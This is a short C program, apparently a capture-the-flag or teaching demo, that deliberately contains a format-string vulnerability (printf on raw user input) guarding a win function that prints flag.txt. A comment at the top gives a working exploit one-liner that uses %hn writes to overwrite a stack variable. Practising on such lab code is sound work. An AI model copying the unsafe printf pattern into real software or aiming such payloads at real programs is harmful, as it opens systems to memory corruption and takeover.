// python2 -c 'print "\x54\xc6\xff\xff" + "\x56\xc6\xff\xff" + "%4911c" + "%6$hn" + "%7$hn"' | ./08_fmt_demo
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void win()
{
    system("cat flag.txt");
}

void fail()
{
    puts("rip rip");
}

void menu()
{
    int change_me = 0xdeadbeef;
    char buff[100];

    while (change_me != 0x13371337) {
        printf("Target is at %p and is: %lx\n", &change_me, change_me);
        if (EOF == scanf("%100s", buff)) {
            return;
        }

        printf("You inputted: ");
        printf(buff);
        puts("");
        printf("Target is at %p and is: %lx\n", &change_me, change_me);
    }
    printf("good bye\n");
}

int main()
{
    // Test 
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    menu();
}
